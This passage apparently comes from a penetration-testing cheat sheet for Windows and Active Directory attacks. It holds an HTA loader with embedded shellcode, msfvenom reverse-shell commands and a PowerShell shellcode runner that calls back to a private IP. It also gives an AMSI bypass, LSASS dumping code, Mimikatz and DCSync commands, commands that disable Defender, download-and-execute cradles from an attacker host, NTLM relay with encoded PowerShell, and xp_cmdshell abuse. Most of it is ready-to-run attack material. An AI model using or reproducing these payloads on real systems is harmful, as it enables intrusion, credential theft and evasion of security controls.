"AEluaXRpYWxpemVBcnJheQBFeGFtcGxlQXNzZW1ibHkAQ29weQAAAAAAAAAAU4UJrN5/l0O+nSHN"+
"RrvpygAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBAcCCBgHAAIBElERVQIGGAgABAEdBQgYCAUA"+
"ARJhDgi3elxWGTTgiQMGERAHAAQYGAkJCQkABhgYCRgYCRgFAAIJGAkIAQAIAAAAAAAeAQABAFQC"+
"FldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAAFAEAD0V4YW1wbGVBc3NlbWJseQAAKQEA"+
"JEV4YW1wbGUgQXNzZW1ibHkgZm9yIERvdE5ldFRvSlNjcmlwdAAABQEAAAAAJAEAH0NvcHlyaWdo"+
"dCDCqSBKYW1lcyBGb3JzaGF3IDIwMTcAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMz"+
"N2FiZTU3NzcAAAwBAAcxLjAuMC4wAAAFAQABAAAEAQAAAAAAAAAAZfOcZgAAAAACAAAAHAEAAIAp"+
"AACACwAAUlNEU7srqk0SrYROuqOpuiYU2esBAAAAQzpcVG9vbHNcRG90TmV0VG9KU2NyaXB0LW1h"+
"c3RlclxEb3ROZXRUb0pTY3JpcHQtbWFzdGVyXEV4YW1wbGVBc3NlbWJseVxvYmpceDY0XFJlbGVh"+
"c2VcRXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAD8SIPk8OjMAAAAQVFBUFJIMdJRZUiLUmBWSItSGEiLUiBNMclIi3JQSA+3SkpIMcCsPGF8"+
"AiwgQcHJDUEBweLtUkiLUiBBUYtCPEgB0GaBeBgLAg+FcgAAAIuAiAAAAEiFwHRnSAHQi0gYUESL"+
"QCBJAdDjVk0xyUj/yUGLNIhIAdZIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsM"+
"SESLQBxJAdBBiwSIQVhBWEgB0F5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulL////XUgx21NJvndp"+
"bmluZXQAQVZIieFJx8JMdyYH/9VTU0iJ4VNaTTHATTHJU1NJujpWeacAAAAA/9XoDwAAADE5Mi4x"+
"NjguNDUuMTc0AFpIicFJx8C7AQAATTHJU1NqA1NJuleJn8YAAAAA/9XoNgAAAC9RZGc3cHJnc01D"+
"aGpmV0pfQmVHUkpBR09ZUHRQQS1rekNjOVVVbl84c0puR1E0YkdGNHpCAEiJwVNaQVhNMclTSLgA"+
"MqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VN"+
"McBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUA"+
"AABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6"+
"EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1QAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAAB"+
"AAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAALADAAAAAAAAAAAAALADNAAAAFYA"+
"UwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/"+
"AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAA"+
"AAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAQQAwAAAQBTAHQAcgBpAG4AZwBG"+
"AGkAbABlAEkAbgBmAG8AAADsAgAAAQAwADAAMAAwADAANABiADAAAABiACUAAQBDAG8AbQBtAGUA"+
"bgB0AHMAAABFAHgAYQBtAHAAbABlACAAQQBzAHMAZQBtAGIAbAB5ACAAZgBvAHIAIABEAG8AdABO"+
"AGUAdABUAG8ASgBTAGMAcgBpAHAAdAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAA"+
"AAAAAAAASAAQAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAEUAeABhAG0AcABs"+
"AGUAQQBzAHMAZQBtAGIAbAB5AAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4A"+
"MAAuADAALgAwAAAASAAUAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAuAGQAbABsAAAAYgAfAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcA"+
"aAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAASgBhAG0AZQBzACAARgBvAHIAcwBoAGEAdwAg"+
"ADIAMAAxADcAAAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAA"+
"UAAUAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBz"+
"AHMAZQBtAGIAbAB5AC4AZABsAGwAAABAABAAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEUA"+
"eABhAG0AcABsAGUAQQBzAHMAZQBtAGIAbAB5AAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBz"+
"AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxl"+
"Y3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}

</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

### PowerShell Download Cradle

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 EXITFUNC=thread -f ps1
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 EXITFUNC=thread -f ps1
```

add it to run.txt.

```bash
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp=@()
    $assem.GetMethods() | 
    ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}} 
    
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName)) 
    
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void] 
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule('InMemoryModule', $false). DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func). SetImplementationFlags('Runtime, Managed')
    
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    return $type.CreateType() 
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xf,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x32,0x33,0x32,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xe1,0x0,0x0,0x0,0x2f,0x36,0x68,0x38,0x69,0x51,0x58,0x4a,0x78,0x53,0x58,0x78,0x41,0x74,0x45,0x47,0x32,0x4a,0x68,0x64,0x49,0x75,0x67,0x4a,0x36,0x64,0x70,0x70,0x6b,0x73,0x4e,0x42,0x63,0x58,0x2d,0x63,0x67,0x4a,0x42,0x33,0x4c,0x54,0x48,0x75,0x2d,0x59,0x55,0x75,0x6e,0x6a,0x4d,0x50,0x7a,0x48,0x51,0x4c,0x4c,0x69,0x46,0x4a,0x57,0x4b,0x69,0x38,0x57,0x67,0x4d,0x61,0x6c,0x6e,0x37,0x56,0x64,0x4b,0x76,0x47,0x31,0x5f,0x6e,0x65,0x4a,0x72,0x56,0x51,0x5a,0x53,0x70,0x30,0x41,0x2d,0x32,0x78,0x4c,0x41,0x61,0x5f,0x55,0x33,0x70,0x34,0x6e,0x5f,0x58,0x71,0x7a,0x51,0x54,0x50,0x76,0x62,0x77,0x33,0x33,0x57,0x5a,0x6c,0x70,0x5a,0x50,0x4f,0x61,0x31,0x64,0x48,0x76,0x77,0x35,0x39,0x34,0x77,0x64,0x36,0x44,0x34,0x75,0x34,0x4d,0x35,0x62,0x55,0x4b,0x65,0x39,0x66,0x42,0x71,0x49,0x4e,0x63,0x45,0x49,0x56,0x32,0x44,0x67,0x44,0x66,0x63,0x46,0x42,0x63,0x4a,0x4d,0x67,0x41,0x6b,0x78,0x56,0x56,0x35,0x66,0x4a,0x4f,0x55,0x76,0x4a,0x64,0x58,0x37,0x62,0x72,0x74,0x6e,0x4f,0x51,0x58,0x4d,0x71,0x47,0x6e,0x36,0x41,0x6a,0x2d,0x36,0x56,0x56,0x31,0x38,0x61,0x64,0x70,0x79,0x35,0x46,0x37,0x67,0x4a,0x32,0x6d,0x44,0x62,0x45,0x61,0x6b,0x35,0x33,0x4d,0x73,0x70,0x6e,0x66,0x75,0x59,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

### AMSI Bypass

AMSI.txt

```bash
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### LSASS Dump

dump.exe (release, x64)

```bash
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass"); int lsass_pid = lsass[0].Id;
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
```
```bash
privilege::debug

sekurlsa::minidump C:\Windows\Tasks\lsass.dmp

sekurlsa::logonpasswords
```

### CLM and AppLocker Bypass (through InstallUtil)

```bash
$ExecutionContext.SessionState.LanguageMode
```

```bash
git clone https://github.com/Karmaz95/evasion
```

```bash
upload /var/www/html/bypass-clm.exe c:\\users\\someone\\documents\\bypass-clm.exe
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U bypass-clm.exe
```

### SharpHound

PowerShell version.

```bash
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
```

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

(new-object system.net.webclient).downloadstring('http://$kali_ip/SharpHound.ps1') | IEX

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

Invoke-BloodHound -CollectionMethod All -Domain domain.com -zipFileName loot.zip

dir . | findstr /i "loot"

^Z

download C:\\Windows\\System32\\20240723035314_loot.zip /var/www/html/20240723035314_loot.zip
```

```bash
Invoke-BloodHound -SearchForest -CollectionMethod All -Domain DOMAIN.COM -zipFileName loot.zip
```

Exe version.

```bash
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
```

```bash
.\SharpHound.exe --memcache -c all -d DOMAIN.COM -DomainController $dc-ip
```

### ReadLAPSPassword

PowerShell version.

```bash
wget https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
```

```bash
Get-LAPSPasswords
```

Metasploit version.

```bash
use post/windows/gather/credentials/enum_laps
set session <?>
exploit
```

### HostRecon

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/HostRecon.ps1') | IEX
```

### Windows PE Check

Powerup

```bash
wget https://github.com/EmpireProject/Empire/raw/master/data/module_source/privesc/PowerUp.ps1
```

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/PowerUp.ps1') | IEX

Invoke-AllChecks
```

Sherlock

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

```bash
Find-AllVulns
```

PrivEscCheck

```bash
wget https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1
```

```bash
(New-Object System.Net.WebClient).DownloadString('http://$kali_ip/PrivescCheck.ps1') | IEX

Invoke-PrivescCheck
```

### PowerView

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

```bash
powershell

(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

(new-object system.net.webclient).downloadstring('http://$kali_ip/pvieww.ps1') | IEX
```

Enumerate Domain Trusts.

```bash
Get-ForestDomain

Invoke-MapDomainTrust | select SourceName, TargetName, TrustDirection
```

Unconstrained Delegation Enumeration.

```bash
Get-DomainComputer -Unconstrained
```

Constrained Delegation Enumeration.

```bash
Get-DomainUser -TrustedToAuth
```

Resource-based Constrained Delegation Enumeration.

```bash
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

### Unconstrained Delegation

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/pvieww.ps1') | IEX

Get-DomainComputer -Unconstrained

dir \\$target_computer_name\pipe\spoolss
```

Next, we’ll download SpoolSample.exe and Rubeus.exe

```bash
git clone https://github.com/jtmpu/PrecompiledBinaries
```

Victim terminal 1:

```bash
Rubeus.exe monitor /interval:5
```

Victim terminal 2:

```bash
SpoolSample.exe $target_computer_name $victim_computer_name
```

Inject into memory.

```bash
Rubeus.exe ptt /ticket:???
```

Now we have domain access, we can dcsync anyone’s passwords.

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.com /user:domain\krbtgt"'
```

### PowerUpSQL

```bash
wget https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
```

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/PowerUpSQL.ps1') | IEX
```

```bash
Get-SQLServerInfo;  Get-SQLServerLinkCrawl -verbose -instance "???"; Get-SQLServerLinkCrawl -verbose -instance "???" -username '???' -password '???'
```

### Crackmapexec

```bash
crackmapexec smb --shares $ip -u '' -p ''     
```

```bash
proxychains crackmapexec smb $ip -u'administrator' -H'???'
```

```bash
proxychains crackmapexec smb $ip -u'administrator' -H'???' --local-auth
```

### PsExec

```bash
python impacket/examples/psexec.py -hashes 00000000000000000000000000000000:??? Administrator@$ip
```

### RDP PTH

```bash
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

```bash
xfreerdp /v:$ip /u:administrator /pth:??? +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore
```

### MSSQLClient

```bash
python3 impacket/examples/mssqlclient.py $domain/$user:$pass@$ip
```

```bash
python3 impacket/examples/mssqlclient.py $domain/$user:$pass@$ip -windows-auth
```

### MSSQL Enumeration

User Enumeration.

```bash
SELECT @@version; SELECT system_user; SELECT user_name(); SELECT IS_SRVROLEMEMBER('sysadmin');
```

Database/Tables Enumeration.

```bash
SELECT TABLE_NAME FROM information_schema.TABLES; SELECT column_name FROM information_schema.COLUMNS;
```

Impersonation Privileges Enumeration.

```css
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

Enable xp_cmdshell

```bash
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured  FROM sys.configurations  WHERE name = 'xp_cmdshell'
```

```bash
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

UNC Path Injection

```css
responder -I tun0
```

```css
EXEC ('master..xp_dirtree "\\$kali_ip\\test"');
```

Then either crack hash

```css
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Or execute commands.

```bash
$text = "(New-Object System.Net.WebClient).DownloadString('http://$kali_ip/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

```bash
proxychains impacket-ntlmrelayx --no-http-server -smb2support -t $ip -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA0AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'
```

```bash
EXEC ('master..xp_dirtree "\\$kali_ip\\test"');
```

Or just dump hash.

```bash
proxychains impacket-ntlmrelayx -smb2support -t $ip
```

```bash
EXEC ('master..xp_dirtree "\\$kali_ip\\service"');
```

Or even execute commands.

```bash
proxychains impacket-ntlmrelayx -smb2support -t $ip -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://$kali_ip/run.txt')"
```

### MSSQL Linked Servers Enumeration

```bash
select myuser from openquery("???", 'select SYSTEM_USER as myuser');
```

```bash
select myuser from openquery("???", 'SELECT distinct b.name as myuser FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''');
```

```bash
EXEC ('SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured  FROM sys.configurations  WHERE name = ''xp_cmdshell''') AT ???
```

Enable xp_cmdshell.

```bash
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT ???
```

Download powershell cradle.

```bash
EXEC ('EXEC xp_cmdshell ''powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring(''''http://$kali_ip/run.txt''''))'';') AT SQL27
```

```bash
powershell -exec bypass -nop -c "iex((new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt'));iex((new-object system.net.webclient).downloadstring('http://$kali_ip/run.txt'))"
```

### Keytabs

```bash
git clone https://github.com/its-a-feature/KeytabParser
```

```bash
python2.7 KeytabParser.py /etc/krb5.keytab
```

Then request for tickets using the NTLM hash.

```bash
proxychains impacket/examples/getTGT.py DOMAIN.COM/'MACHINE_NAME$' -dc-ip $dc_ip -hashes :???
```

### Cross-Forest Enumeration

```bash
powershell

([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

(new-object system.net.webclient).downloadstring('http://$kali_ip/pvieww.ps1') | IEX

Get-DomainTrust -Domain core-jijistudio.com

Get-DomainUser -Domain DOMAIN.COM

Get-DomainForeignGroupMember -Domain DOMAIN.COM

convertfrom-sid ???

Get-DomainGroup -Identity "???" -Domain DOMAIN.COM
```

### Mimikatz

PowerShell version.

```bash
powershell

(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

(new-object system.net.webclient).downloadstring('http://$kali_ip/Invoke-Mimikatz.ps1') | IEX

Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:domain.com /user:domain.com\pete"'
```

```bash
powershell

(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

cd \windows\tasks

certutil -urlcache -split -f http://$kali_ip/mimikatz.exe

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

.\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"

.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"
```

